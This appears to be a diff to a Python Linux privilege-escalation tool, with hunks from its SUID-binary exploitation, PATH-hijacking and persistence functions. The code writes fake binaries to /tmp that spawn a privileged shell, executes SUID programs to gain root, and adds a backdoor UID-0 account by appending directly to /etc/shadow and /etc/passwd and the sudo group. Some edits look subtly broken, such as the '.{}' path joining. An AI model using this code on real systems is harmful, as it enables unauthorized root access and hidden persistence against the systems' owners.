@@ -441,6 +441,8 @@ def suid():
                cmd = suid_bins_exec[key].strip()
                print(cmd)
                os.system("{}".format(cmd))
+               os.system("echo '### if no root permissions, run the following: {}' >> /tmp/suid_esc.txt".format(cmd))
+               time.sleep(5)
                break
             else:
                continue
@@ -486,8 +488,8 @@ def path():
                os.system("echo '### {} does not specify full path of *{}* command... run 'whoami' to confirm root privileges ###' | tee -a /tmp/path_res.txt".format(path,cmd))
                os.system("touch /tmp/{}&&echo '#!/bin/bash' > /tmp/{}&&echo '/bin/bash -p' >> /tmp/{}&&chmod +x /tmp/{}".format(cmd,cmd,cmd,cmd))
                os.system("export PATH=/tmp:$PATH")
-               os.system("./{}".format(path))
-               os.system("/{}".format(path))
+               os.system(".{}".format(path))
+               os.system("{}".format(path))
                os.system("/bin/bash {}".format(path))
                break
             else:
@@ -580,7 +582,7 @@ def add_user(username,password):
       print("\n### establishing persistence... ###")
       os.system("mkpasswd {} > /tmp/backups/pass.txt".format(password))
       pass_file = open("/tmp/backups/pass.txt", "r")
-      new_user_pass = pass_file.readlines()[-1].strip()
+      new_user_pass = pass_file.readline().strip()
       os.system("echo '{}:{}:19448:0:99999:7:::' >> /etc/shadow".format(username,new_user_pass))
       os.system("echo '{}:x:0:0:{}:/{}:/bin/bash' >> /etc/passwd".format(username,username,username))
       os.system("usermod -aG sudo {}".format(username))
